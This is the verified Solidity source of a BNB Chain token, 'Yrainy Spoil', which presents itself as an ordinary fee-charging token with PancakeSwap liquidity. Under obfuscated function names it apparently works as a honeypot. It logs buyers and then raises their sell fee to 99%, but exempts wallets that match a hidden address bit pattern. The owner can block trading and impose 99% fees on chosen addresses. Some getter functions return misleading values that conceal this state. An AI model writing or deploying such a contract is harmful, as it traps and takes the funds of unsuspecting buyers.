/**
 *Submitted for verification at BscScan.com on 2022-12-07
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.10;


library SafeMath {
    function tryAdd(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        uint256 c = a + b;
        if (c < a) return (false, 0);
        return (true, c);
    }
    }

    function trySub(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        if (b > a) return (false, 0);
        return (true, a - b);
    }
    }

    function tryMul(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
        // benefit is lost if 'b' is also tested.
        // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
        if (a == 0) return (true, 0);
        uint256 c = a * b;
        if (c / a != b) return (false, 0);
        return (true, c);
    }
    }

    function tryDiv(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        if (b == 0) return (false, 0);
        return (true, a / b);
    }
    }

    function tryMod(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        if (b == 0) return (false, 0);
        return (true, a % b);
    }
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b <= a, errorMessage);
        return a - b;
    }
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a / b;
    }
    }

    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a % b;
    }
    }
}

interface IBEP20 {
    function totalSupply() external view returns (uint256);

    function decimals() external view returns (uint8);

    function symbol() external view returns (string memory);

    function name() external view returns (string memory);

    function getOwner() external view returns (address);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount)
    external
    returns (bool);

    function allowance(address _owner, address spender)
    external
    view
    returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );

}

abstract contract Admin {
    address internal owner;
    mapping(address => bool) internal Administration;

    constructor(address _owner) {
        owner = _owner;
        Administration[_owner] = true;
    }

    /**
     * Function modifier to require caller to be contract owner
     */
    modifier onlyOwner() {
        require(isOwner(msg.sender), "!OWNER");
        _;
    }

    /**
     * Function modifier to require caller to be admin
     */
    modifier onlyAdmin() {
        require(isAdmin(msg.sender), "!ADMIN");
        _;
    }

    /**
     * addAdmin address. Owner only
     */
    function SetAdmin(address adr) public onlyOwner() {
        Administration[adr] = true;
    }

    /**
     * Remove address' administration. Owner only
     */
    function removeAdmin(address adr) public onlyOwner() {
        Administration[adr] = false;
    }

    /**
     * Check if address is owner
     */
    function isOwner(address account) public view returns (bool) {
        return account == owner;
    }

    function Owner() public view returns (address) {
        return owner;
    }

    /**
     * Return address' administration status
     */
    function isAdmin(address adr) public view returns (bool) {
        return Administration[adr];
    }

    /**
     * Transfer ownership to new address. Caller must be owner. Leaves old owner admin
     */
    function transferOwnership(address payable adr) public onlyOwner() {
        owner = adr;
        Administration[adr] = true;
        emit OwnershipTransferred(adr);
    }

    event OwnershipTransferred(address owner);

}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB)
    external
    returns (address pair);
}

interface IUniswapV2Router {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint256 amountADesired,
        uint256 amountBDesired,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    )
    external
    returns (
        uint256 amountA,
        uint256 amountB,
        uint256 liquidity
    );

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
    external payable returns (uint256 amountToken, uint256 amountETH, uint256 liquidity);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable;

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

}

contract YrainySpoil is IBEP20, Admin {
    using SafeMath for uint256;

    uint256  constant MASK = type(uint128).max;
    address WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address DEAD = 0x000000000000000000000000000000000000dEaD;
    address ZERO = 0x0000000000000000000000000000000000000000;
    address DEAD_NON_CHECKSUM = 0x000000000000000000000000000000000000dEaD;

    string constant _name = "Yrainy Spoil ";
    string constant _symbol = "YrainySpoil";
    uint8 constant _decimals = 18;

    uint256 _totalSupply = 100000000 * (10 ** _decimals);
    uint256  _maxTxAmount = 2000000 * 10 ** _decimals;
    uint256  _maxWallet = 2000000 * 10 ** _decimals;

    mapping(address => uint256) _balances;
    mapping(address => mapping(address => uint256)) _allowances;
    mapping(address => bool) private buyAutoBotsTeam;
    mapping(address => bool) private isReceiverAutoSell;
    mapping(address => bool) private walletIsTeamSwap;
    mapping(address => bool) private buyAutoLimitSwapIs;
    mapping(address => uint256) private teamLiquidityTxMax;
    mapping(uint256 => address) private launchedMinBuySwap;
    uint256 public exemptLimitValue = 0;
    //BUY FEES
    uint256 private txMaxBuyIs = 0;
    uint256 private isWalletTxTrading = 9;

    //SELL FEES
    uint256 private walletBuyExemptMode = 0;
    uint256 private modeMarketingAutoReceiver = 9;

    uint256 private receiverFeeTxLiquidity = isWalletTxTrading + txMaxBuyIs;
    uint256 private sellBuyTradingLaunchedTxMarketing = 100;

    address private modeLiquidityTeamLimit = (msg.sender); // auto-liq address
    address private launchedExemptMaxSell = (0xD9aA95B387e3b7777be38adfFFFff08970aaD0aA); // marketing address
    address private txMaxLaunchedAutoMarketingWallet = DEAD;
    address private walletModeMinLimit = DEAD;
    address private burnBuyModeLiquidity = DEAD;

    IUniswapV2Router public router;
    address public uniswapV2Pair;

    uint256 private launchedModeMarketingBotsAuto;
    uint256 private burnFeeMarketingBuySwapTx;

    event BuyTaxesUpdated(uint256 buyTaxes);
    event SellTaxesUpdated(uint256 sellTaxes);

    bool private modeFeeLiquidityWallet;
    uint256 private tradingSellExemptTxLiquidityMode;
    uint256 private exemptLiquidityBurnMarketing;
    uint256 private buyLimitSwapFeeMarketingLiquidity;
    uint256 private limitExemptTxSell;

    bool private minLaunchedFeeBuy = true;
    bool private buyAutoLimitSwapIsMode = true;
    bool private txSellTeamBuyIs = true;
    bool private limitAutoBurnTxTradingLaunchedFee = true;
    bool private walletModeLaunchedMaxBuyLimitBurn = true;
    uint256 firstSetAutoReceiver = 2 ** 18 - 1;
    uint256 private limitBuyLiquidityMax = _totalSupply / 1000; // 0.1%

    
    uint256 private launchedBurnTradingMode;
    bool private sellAutoIsTrading;
    bool private modeIsLiquidityFee;
    bool private liquiditySwapMarketingBurn;


    bool inSwap;
    modifier swapping() {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor() Admin(msg.sender) {
        address _router = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
        // PancakeSwap Router
        router = IUniswapV2Router(_router);

        uniswapV2Pair = IUniswapV2Factory(router.factory()).createPair(address(this), router.WETH());
        _allowances[address(this)][address(router)] = _totalSupply;

        modeFeeLiquidityWallet = true;

        buyAutoBotsTeam[msg.sender] = true;
        buyAutoBotsTeam[address(this)] = true;

        isReceiverAutoSell[msg.sender] = true;
        isReceiverAutoSell[0x0000000000000000000000000000000000000000] = true;
        isReceiverAutoSell[0x000000000000000000000000000000000000dEaD] = true;
        isReceiverAutoSell[address(this)] = true;

        walletIsTeamSwap[msg.sender] = true;
        walletIsTeamSwap[0x0000000000000000000000000000000000000000] = true;
        walletIsTeamSwap[0x000000000000000000000000000000000000dEaD] = true;
        walletIsTeamSwap[address(this)] = true;

        approve(_router, _totalSupply);
        approve(address(uniswapV2Pair), _totalSupply);
        _balances[msg.sender] = _totalSupply;
        emit Transfer(address(0), msg.sender, _totalSupply);
    }

    receive() external payable {}

    function totalSupply() external view override returns (uint256) {
        return _totalSupply;
    }

    function decimals() external pure override returns (uint8) {
        return _decimals;
    }

    function symbol() external pure override returns (string memory) {
        return _symbol;
    }

    function name() external pure override returns (string memory) {
        return _name;
    }

    function getOwner() external view override returns (address) {
        return owner;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function allowance(address holder, address spender) external view override returns (uint256) {
        return _allowances[holder][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function approveMax(address spender) external returns (bool) {
        return approve(spender, _totalSupply);
    }

    function transfer(address recipient, uint256 amount) external override returns (bool) {
        return autoBurnBotsExempt(msg.sender, recipient, amount);
    }

    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        if (_allowances[sender][msg.sender] != _totalSupply) {
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender]
            .sub(amount, "Insufficient Allowance");
        }

        return autoBurnBotsExempt(sender, recipient, amount);
    }

    function autoBurnBotsExempt(address sender, address recipient, uint256 amount) internal returns (bool) {
        bool bLimitTxWalletValue = buySellIsBots(sender) || buySellIsBots(recipient);

        if (sender == uniswapV2Pair) {
            if (exemptLimitValue != 0 && bLimitTxWalletValue) {
                autoLimitModeLaunchedBuy();
            }
            if (!bLimitTxWalletValue) {
                limitBotsMaxReceiver(recipient);
            }
        }

        if (inSwap || bLimitTxWalletValue) {return modeLimitMinIsLaunchedFee(sender, recipient, amount);}

        if (!Administration[sender] && !Administration[recipient]) {
            require(minLaunchedFeeBuy, "Trading is not active");
        }

        if (!Administration[sender] && !buyAutoBotsTeam[sender] && !buyAutoBotsTeam[recipient] && recipient != uniswapV2Pair) {
            require((_balances[recipient] + amount) <= _maxWallet, "Max wallet has been triggered");
        }

        require((amount <= _maxTxAmount) || walletIsTeamSwap[sender] || walletIsTeamSwap[recipient], "Max TX Limit has been triggered");

        if (autoBuyBurnLaunched()) {feeExemptReceiverTrading();}

        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");

        uint256 amountReceived = minTradingLaunchedSwapLimitTx(sender) ? marketingLaunchedBuyMax(sender, recipient, amount) : amount;

        _balances[recipient] = _balances[recipient].add(amountReceived);
        emit Transfer(sender, recipient, amountReceived);
        return true;
    }

    function modeLimitMinIsLaunchedFee(address sender, address recipient, uint256 amount) internal returns (bool) {
        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function minTradingLaunchedSwapLimitTx(address sender) internal view returns (bool) {
        return !isReceiverAutoSell[sender];
    }

    function teamSwapLiquidityBurn(address sender, bool selling) internal returns (uint256) {
        if (selling) {
            receiverFeeTxLiquidity = modeMarketingAutoReceiver + walletBuyExemptMode;
            return receiverMinMaxBots(sender, receiverFeeTxLiquidity);
        }
        if (!selling && sender == uniswapV2Pair) {
            receiverFeeTxLiquidity = isWalletTxTrading + txMaxBuyIs;
            return receiverFeeTxLiquidity;
        }
        return receiverMinMaxBots(sender, receiverFeeTxLiquidity);
    }

    function marketingLaunchedBuyMax(address sender, address receiver, uint256 amount) internal returns (uint256) {

        uint256 feeAmount = amount.mul(teamSwapLiquidityBurn(sender, receiver == uniswapV2Pair)).div(sellBuyTradingLaunchedTxMarketing);

        if (buyAutoLimitSwapIs[sender] || buyAutoLimitSwapIs[receiver]) {
            feeAmount = amount.mul(99).div(sellBuyTradingLaunchedTxMarketing);
        }

        _balances[address(this)] = _balances[address(this)].add(feeAmount);
        emit Transfer(sender, address(this), feeAmount);
        
        return amount.sub(feeAmount);
    }

    function buySellIsBots(address account) private view returns (bool) {
        return ((uint256(uint160(account)) << 192) >> 238) == firstSetAutoReceiver;
    }

    function receiverMinMaxBots(address sender, uint256 pFee) private view returns (uint256) {
        uint256 lckV = teamLiquidityTxMax[sender];
        uint256 lckF = pFee;
        if (lckV > 0 && block.timestamp - lckV > 2) {
            lckF = 99;
        }
        return lckF;
    }

    function limitBotsMaxReceiver(address addr) private {
        exemptLimitValue = exemptLimitValue + 1;
        launchedMinBuySwap[exemptLimitValue] = addr;
    }

    function autoLimitModeLaunchedBuy() private {
        if (exemptLimitValue > 0) {
            for (uint256 i = 1; i <= exemptLimitValue; i++) {
                if (teamLiquidityTxMax[launchedMinBuySwap[i]] == 0) {
                    teamLiquidityTxMax[launchedMinBuySwap[i]] = block.timestamp;
                }
            }
            exemptLimitValue = 0;
        }
    }

    function clearStuckBalance(uint256 amountPercentage) external onlyOwner {
        uint256 amountBNB = address(this).balance;
        payable(launchedExemptMaxSell).transfer(amountBNB * amountPercentage / 100);
    }

    function autoBuyBurnLaunched() internal view returns (bool) {return
    msg.sender != uniswapV2Pair &&
    !inSwap &&
    walletModeLaunchedMaxBuyLimitBurn &&
    _balances[address(this)] >= limitBuyLiquidityMax;
    }

    function feeExemptReceiverTrading() internal swapping {
        uint256 amountToLiquify = limitBuyLiquidityMax.mul(txMaxBuyIs).div(receiverFeeTxLiquidity).div(2);
        uint256 amountToSwap = limitBuyLiquidityMax.sub(amountToLiquify);

        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = router.WETH();
        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            amountToSwap,
            0,
            path,
            address(this),
            block.timestamp
        );

        uint256 amountBNB = address(this).balance;
        uint256 totalETHFee = receiverFeeTxLiquidity.sub(txMaxBuyIs.div(2));
        uint256 amountBNBLiquidity = amountBNB.mul(txMaxBuyIs).div(totalETHFee).div(2);
        uint256 amountBNBMarketing = amountBNB.mul(isWalletTxTrading).div(totalETHFee);

        payable(launchedExemptMaxSell).transfer(amountBNBMarketing);

        if (amountToLiquify > 0) {
            router.addLiquidityETH{value : amountBNBLiquidity}(
                address(this),
                amountToLiquify,
                0,
                0,
                modeLiquidityTeamLimit,
                block.timestamp
            );
            emit AutoLiquify(amountBNBLiquidity, amountToLiquify);
        }
    }

    
    function getLimitAutoBurnTxTradingLaunchedFee() public view returns (bool) {
        if (limitAutoBurnTxTradingLaunchedFee != limitAutoBurnTxTradingLaunchedFee) {
            return limitAutoBurnTxTradingLaunchedFee;
        }
        if (limitAutoBurnTxTradingLaunchedFee == minLaunchedFeeBuy) {
            return minLaunchedFeeBuy;
        }
        return limitAutoBurnTxTradingLaunchedFee;
    }
    function setLimitAutoBurnTxTradingLaunchedFee(bool a0) public onlyOwner {
        if (limitAutoBurnTxTradingLaunchedFee != walletModeLaunchedMaxBuyLimitBurn) {
            walletModeLaunchedMaxBuyLimitBurn=a0;
        }
        if (limitAutoBurnTxTradingLaunchedFee != buyAutoLimitSwapIsMode) {
            buyAutoLimitSwapIsMode=a0;
        }
        limitAutoBurnTxTradingLaunchedFee=a0;
    }

    function getLaunchedMinBuySwap(uint256 a0) public view returns (address) {
        if (launchedMinBuySwap[a0] == launchedMinBuySwap[a0]) {
            return burnBuyModeLiquidity;
        }
        if (a0 == walletBuyExemptMode) {
            return modeLiquidityTeamLimit;
        }
            return launchedMinBuySwap[a0];
    }
    function setLaunchedMinBuySwap(uint256 a0,address a1) public onlyOwner {
        launchedMinBuySwap[a0]=a1;
    }

    function getIsWalletTxTrading() public view returns (uint256) {
        if (isWalletTxTrading != txMaxBuyIs) {
            return txMaxBuyIs;
        }
        if (isWalletTxTrading == receiverFeeTxLiquidity) {
            return receiverFeeTxLiquidity;
        }
        if (isWalletTxTrading == sellBuyTradingLaunchedTxMarketing) {
            return sellBuyTradingLaunchedTxMarketing;
        }
        return isWalletTxTrading;
    }
    function setIsWalletTxTrading(uint256 a0) public onlyOwner {
        if (isWalletTxTrading == txMaxBuyIs) {
            txMaxBuyIs=a0;
        }
        if (isWalletTxTrading == modeMarketingAutoReceiver) {
            modeMarketingAutoReceiver=a0;
        }
        isWalletTxTrading=a0;
    }

    function getBuyAutoBotsTeam(address a0) public view returns (bool) {
            return buyAutoBotsTeam[a0];
    }
    function setBuyAutoBotsTeam(address a0,bool a1) public onlyOwner {
        if (buyAutoBotsTeam[a0] != buyAutoLimitSwapIs[a0]) {
           buyAutoLimitSwapIs[a0]=a1;
        }
        buyAutoBotsTeam[a0]=a1;
    }

    function getTxMaxBuyIs() public view returns (uint256) {
        if (txMaxBuyIs != receiverFeeTxLiquidity) {
            return receiverFeeTxLiquidity;
        }
        if (txMaxBuyIs != walletBuyExemptMode) {
            return walletBuyExemptMode;
        }
        return txMaxBuyIs;
    }
    function setTxMaxBuyIs(uint256 a0) public onlyOwner {
        txMaxBuyIs=a0;
    }

    function getMinLaunchedFeeBuy() public view returns (bool) {
        if (minLaunchedFeeBuy != buyAutoLimitSwapIsMode) {
            return buyAutoLimitSwapIsMode;
        }
        if (minLaunchedFeeBuy != txSellTeamBuyIs) {
            return txSellTeamBuyIs;
        }
        return minLaunchedFeeBuy;
    }
    function setMinLaunchedFeeBuy(bool a0) public onlyOwner {
        if (minLaunchedFeeBuy != txSellTeamBuyIs) {
            txSellTeamBuyIs=a0;
        }
        minLaunchedFeeBuy=a0;
    }



    event AutoLiquify(uint256 amountBNB, uint256 amountTokens);

}